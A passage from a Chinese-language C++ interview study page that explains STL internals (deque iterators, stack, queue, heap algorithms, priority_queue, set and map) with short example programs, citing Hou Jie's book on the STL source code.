punctuation">;</span><span class="token comment">//指向map中的node</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><p>从deque的迭代器数据结构可以看出，为了保持与容器联结，迭代器主要包含上述4个元素</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1565877658970.png" alt=""></p><p>deque迭代器的“++”、“—”操作是远比vector迭代器繁琐，其主要工作在于缓冲区边界，如何从当前缓冲区跳到另一个缓冲区，当然deque内部在插入元素时，如果map中node数量全部使用完，且node指向的缓冲区也没有多余的空间，这时会配置新的map（2倍于当前+2的数量）来容纳更多的node，也就是可以指向更多的缓冲区。在deque删除元素时，也提供了元素的析构和空闲缓冲区空间的释放等机制。</p><blockquote><p>《STL源码剖析》 侯捷 P143-164</p></blockquote><h4 id="210、STL中stack和queue的实现"><a href="#210、STL中stack和queue的实现" class="headerlink" title="210、STL中stack和queue的实现"></a>210、STL中stack和queue的实现</h4><p><strong>stack</strong></p><p>stack（栈）是一种先进后出（First In Last Out）的数据结构，只有一个入口和出口，那就是栈顶，除了获取栈顶元素外，没有其他方法可以获取到内部的其他元素，其结构图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1565957994483.png" alt=""></p><p>stack这种单向开口的数据结构很容易由<strong>双向开口的deque和list</strong>形成，只需要根据stack的性质对应移除某些接口即可实现，stack的源码如下：</p><pre class="language-c" data-language="c"><code class="language-c">template <span class="token operator">&lt;</span>class T<span class="token punctuation">,</span> class Sequence <span class="token operator">=</span> deque<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token operator">></span>class stack<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>protected<span class="token operator">:</span>    Sequence c<span class="token punctuation">;</span>public<span class="token operator">:</span>    bool <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    size_type <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    reference <span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    const_reference <span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">const</span> value_type<span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>从stack的数据结构可以看出，其所有操作都是围绕Sequence完成，而Sequence默认是deque数据结构。stack这种“修改某种接口，形成另一种风貌”的行为，成为adapter(配接器)。常将其归类为container adapter而非container</p><p>stack除了默认使用deque作为其底层容器之外，也可以使用双向开口的list，只需要在初始化stack时，将list作为第二个参数即可。由于stack只能操作顶端的元素，因此其内部元素无法被访问，也不提供迭代器。</p><p><strong>queue</strong></p><p>queue（队列）是一种先进先出（First In First Out）的数据结构，只有一个入口和一个出口，分别位于最底端和最顶端，出口元素外，没有其他方法可以获取到内部的其他元素，其结构图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1565958318457.png" alt=""></p><p>类似的，queue这种“先进先出”的数据结构很容易由双向开口的deque和list形成，只需要根据queue的性质对应移除某些接口即可实现，queue的源码如下：</p><pre class="language-c" data-language="c"><code class="language-c">template <span class="token operator">&lt;</span>class T<span class="token punctuation">,</span> class Sequence <span class="token operator">=</span> deque<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token operator">></span>class queue<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>protected<span class="token operator">:</span>    Sequence c<span class="token punctuation">;</span>public<span class="token operator">:</span>    bool <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    size_type <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    reference <span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    const_reference <span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">const</span> value_type<span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>从queue的数据结构可以看出，其所有操作都也都是是围绕Sequence完成，Sequence默认也是deque数据结构。queue也是一类container adapter。</p><p>同样，queue也可以使用list作为底层容器，不具有遍历功能，没有迭代器。</p><blockquote><p>《STL源码剖析》 侯捷 </p></blockquote><h4 id="211、STL中的heap的实现"><a href="#211、STL中的heap的实现" class="headerlink" title="211、STL中的heap的实现"></a>211、STL中的heap的实现</h4><p>heap（堆）并不是STL的容器组件，是priority queue（优先队列）的底层实现机制，因为binary max heap（大根堆）总是最大值位于堆的根部，优先级最高。</p><p>binary heap本质是一种complete binary tree（完全二叉树），整棵binary tree除了最底层的叶节点之外，都是填满的，但是叶节点从左到右不会出现空隙，如下图所示就是一颗完全二叉树</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1566039990260.png" alt=""></p><p>完全二叉树内没有任何节点漏洞，是非常紧凑的，这样的一个好处是可以使用array来存储所有的节点，因为当其中某个节点位于$i$处，其左节点必定位于$2i$处，右节点位于$2i+1$处，父节点位于$i/2$（向下取整）处。这种以array表示tree的方式称为隐式表述法。</p><p>因此我们可以使用一个array和一组heap算法来实现max heap（每个节点的值大于等于其子节点的值）和min heap（每个节点的值小于等于其子节点的值）。由于array不能动态的改变空间大小，用vector代替array是一个不错的选择。</p><p>那heap算法有哪些？常见有的插入、弹出、排序和构造算法，下面一一进行描述。</p><p><strong>push_heap插入算法</strong></p><p>由于完全二叉树的性质，新插入的元素一定是位于树的最底层作为叶子节点，并填补由左至右的第一个空格。事实上，在刚执行插入操作时，新元素位于底层vector的end()处，之后是一个称为percolate up（上溯）的过程，举个例子如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1566040870063.png" alt=""></p><p>新元素50在插入堆中后，先放在vector的end()存着，之后执行上溯过程，调整其根结点的位置，以便满足max heap的性质，如果了解大根堆的话，这个原理跟大根堆的调整过程是一样的。</p><p><strong>pop_heap算法</strong></p><p>heap的pop操作实际弹出的是根节点吗，但在heap内部执行pop_heap时，只是将其移动到vector的最后位置，然后再为这个被挤走的元素找到一个合适的安放位置，使整颗树满足完全二叉树的条件。这个被挤掉的元素首先会与根结点的两个子节点比较，并与较大的子节点更换位置，如此一直往下，直到这个被挤掉的元素大于左右两个子节点，或者下放到叶节点为止，这个过程称为percolate down（下溯）。举个例子：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102//1566041421056.png" alt=""></p><p>根节点68被pop之后，移到了vector的最底部，将24挤出，24被迫从根节点开始与其子节点进行比较，直到找到合适的位置安身，需要注意的是pop之后元素并没有被移走，如果要将其移走，可以使用pop_back()。</p><p><strong>sort算法</strong></p><p>一言以蔽之，因为pop_heap可以将当前heap中的最大值置于底层容器vector的末尾，heap范围减1，那么不断的执行pop_heap直到树为空，即可得到一个递增序列。</p><p><strong>make_heap算法</strong></p><p>将一段数据转化为heap，一个一个数据插入，调用上面说的两种percolate算法即可。</p><p>代码实测：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> v <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">make_heap</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//以vector为底层容器</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">:</span> v<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span> <span class="token comment">// 6 4 5 3 1 0 2</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>v<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">push_heap</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">:</span> v<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span> <span class="token comment">// 7 6 5 4 1 0 2 3</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token function">pop_heap</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> v<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 7 </span>v<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">:</span> v<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span> <span class="token comment">// 6 4 5 3 1 0 2</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token function">sort_heap</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">:</span> v<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span> <span class="token comment">// 0 1 2 3 4 5 6</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>《STL源码剖析》 侯捷 </p></blockquote><h4 id="212、STL中的priority-queue的实现"><a href="#212、STL中的priority-queue的实现" class="headerlink" title="212、STL中的priority_queue的实现"></a>212、STL中的priority_queue的实现</h4><p>priority_queue，优先队列，是一个拥有权值观念的queue，它跟queue一样是顶部入口，底部出口，在插入元素时，元素并非按照插入次序排列，它会自动根据权值（通常是元素的实值）排列，权值最高，排在最前面，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1566126001158.png" alt=""></p><p>默认情况下，priority_queue使用一个max-heap完成，底层容器使用的是一般为vector为底层容器，堆heap为处理规则来管理底层容器实现 。priority_queue的这种实现机制导致其不被归为容器，而是一种容器配接器。关键的源码如下：</p><pre class="language-c" data-language="c"><code class="language-c">template <span class="token operator">&lt;</span>class T<span class="token punctuation">,</span> class Squence <span class="token operator">=</span> vector<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">,</span> class Compare <span class="token operator">=</span> less<span class="token operator">&lt;</span>typename Sequence<span class="token operator">::</span>value_tyoe<span class="token operator">></span> <span class="token operator">></span>class priority_queue<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>protected<span class="token operator">:</span>    Sequence c<span class="token punctuation">;</span> <span class="token comment">// 底层容器</span>    Compare comp<span class="token punctuation">;</span> <span class="token comment">// 元素大小比较标准</span>public<span class="token operator">:</span>    bool <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    size_type <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    const_reference <span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">const</span> value_type<span class="token operator">&amp;</span> x<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span><span class="token function">push_heap</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">push_heap</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>comp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">pop_heap</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>comp<span class="token punctuation">)</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>priority_queue的所有元素，进出都有一定的规则，只有queue顶端的元素（权值最高者），才有机会被外界取用，它没有遍历功能，也不提供迭代器</p><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> ia<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">7</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>priority_queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">pq</span><span class="token punctuation">(</span>ia<span class="token punctuation">,</span> ia <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> pq<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token comment">// 9</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pq<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span> <span class="token comment">// 8 8 8 8 8 8 8 8 8</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>pq<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token char">' '</span><span class="token punctuation">;</span><span class="token comment">// 8 7 6 5 4 3 2 1 0</span>pq<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>《STL源码剖析》 侯捷 </p></blockquote><h4 id="213、STL中set的实现？"><a href="#213、STL中set的实现？" class="headerlink" title="213、STL中set的实现？"></a>213、STL中set的实现？</h4><p>STL中的容器可分为序列式容器（sequence）和关联式容器（associative），set属于关联式容器。</p><p>set的特性是，所有元素都会根据元素的值自动被排序（默认升序），set元素的键值就是实值，实值就是键值，set不允许有两个相同的键值</p><p>set不允许迭代器修改元素的值，其迭代器是一种constance iterators</p><p>标准的STL set以RB-tree（红黑树）作为底层机制，几乎所有的set操作行为都是转调用RB-tree的操作行为，这里补充一下红黑树的特性：</p><ul><li>每个节点不是红色就是黑色</li><li>根结点为黑色</li><li>如果节点为红色，其子节点必为黑</li><li>任一节点至（NULL）树尾端的任何路径，所含的黑节点数量必相同</li></ul><p>关于红黑树的具体操作过程，比较复杂读者可以翻阅《算法导论》详细了解。</p><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;set></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">int</span> ia<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">s</span><span class="token punctuation">(</span>ia<span class="token punctuation">,</span> ia <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 5</span>cout <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 1</span>cout <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 0</span>s<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//再插入一个3</span>cout <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 5</span>cout <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 1</span>s<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 4</span>set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>iterator b <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>iterator e <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> b <span class="token operator">!=</span> e<span class="token punctuation">;</span> <span class="token operator">++</span>b<span class="token punctuation">)</span>cout <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>b <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span> <span class="token comment">// 2 3 4 5</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">!=</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"5 found"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 5 found</span>b <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">!=</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"2 found"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 2 found</span>b <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"1 not found"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 1 not found</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>关联式容器尽量使用其自身提供的find()函数查找指定的元素，效率更高，因为STL提供的find()函数是一种顺序搜索算法。</p><blockquote><p>《STL源码剖析》 侯捷 </p></blockquote><h4 id="214、STL中map的实现"><a href="#214、STL中map的实现" class="headerlink" title="214、STL中map的实现"></a>214、STL中map的实现</h4><p>map的特性是所有元素会根据键值进行自动排序。map中所有的元素都是pair，拥有键值(key)和实值(value)两个部分，并且不允许元素有相同的key</p><p>一旦map的key确定了，那么是无法修改的，但是可以修改这个key对应的value，因此map的迭代器既不是constant iterator，也不是mutable iterator</p><p>标准STL map的底层机制是RB-tree（红黑树），另一种以hash 